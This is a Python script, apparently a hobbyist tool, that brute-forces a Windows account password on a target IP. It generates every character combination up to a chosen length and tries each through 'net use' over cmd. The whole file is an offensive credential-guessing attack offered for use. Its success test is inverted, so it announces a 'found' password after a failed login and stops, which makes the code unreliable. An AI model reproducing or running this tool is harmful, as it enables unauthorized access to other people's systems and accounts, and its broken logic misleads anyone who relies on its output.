import subprocess as sp
import colorama as cc
import itertools
from random import choice
from os import system
import sys


abvc = "qwertyuıopğüasdfghjklşizxcvbnmöç:;QWERTYUIOPĞÜASDFGHJKLŞİZXCVBNMÖÇ1234567890*-_"
colors = [cc.Fore.LIGHTGREEN_EX, cc.Fore.LIGHTBLUE_EX, cc.Fore.LIGHTCYAN_EX, cc.Fore.LIGHTGREEN_EX, cc.Fore.LIGHTRED_EX, cc.Fore.LIGHTYELLOW_EX, cc.Fore.LIGHTWHITE_EX,cc.Fore.LIGHTMAGENTA_EX]

def try_finding(ip="127.0.0.1",maxl=3, user = "Administrator", output=False):
    print(cc.Fore.LIGHTWHITE_EX + "[ Initialize ] Call try_finding")
    print(cc.Fore.LIGHTWHITE_EX + f"[ Initialize ] {ip} | {user} | {maxl} | {output}")
    for value in ("".join(combo)for length in range(1, maxl + 1)for combo in itertools.product(abvc, repeat=length)):
        psw = ''.join(value)
        cop = rf'net use \\{ip} /user:{user} {psw} & echo %errorlevel%'
        if not any(c in psw for c in '"&<|>~¨, '):
            proc = sp.run(
                ["cmd", "/c", cop],
                capture_output=True,
            )
            lines = [l for l in proc.stdout.splitlines() if l.strip().isdigit()]
            success = bool(lines) and int(lines[-1]) == 0
            if output:
                sys.stdout.write(choice(colors) + f"\r> {psw}")
                sys.stdout.flush()
            if int(success) == 0:
                print(cc.Fore.LIGHTGREEN_EX+ rf"[ FOUND ] IP: {ip} | USER: {user} | Password: {"".join(value)}")
                input("enter to exit")
                break
system("cls")
print(cc.Fore.LIGHTYELLOW_EX+ r"""
  ____             _       __  __ ______ 
 |  _ \           | |     |  \/  |  ____|
 | |_) |_ __ _   _| |_ ___| \  / | |__   
 |  _ <| '__| | | | __/ _ \ |\/| |  __|  
 | |_) | |  | |_| | ||  __/ |  | | |____ 
 |____/|_|   \__,_|\__\___|_|  |_|______|
                by @hecker_melon
                                         """ + cc.Fore.LIGHTCYAN_EX + cc.Back.BLACK)
# ill be happy if you dont remove my name 
# you can make @hecker_melon/@yourname
IP = input("[ BRUTE FORCE TOOL ] Enter IP           >> ")
NAME = input(cc.Fore.LIGHTGREEN_EX+ "[ BRUTE FORCE TOOL ] Enter USERNAME     >> ")
PASSWORDLENG = int(input(cc.Fore.LIGHTMAGENTA_EX+ "[ BRUTE FORCE TOOL ] Enter Password len >> "))
output = int(input(cc.Fore.LIGHTRED_EX+ "[ BRUTE FORCE TOOL ] Use Print (if true: reduce performance) (1/0) >> "))
if output == 1:
    output = True
else:
    output = False
print(cc.Fore.LIGHTWHITE_EX + "[ Initialize ] Starting proccess ...")
print(cc.Fore.LIGHTWHITE_EX + f"[ Initialize ] This may take {cc.Fore.RED}HOURS {cc.Fore.LIGHTWHITE_EX}btw")

try_finding(IP, int(PASSWORDLENG), NAME, output)
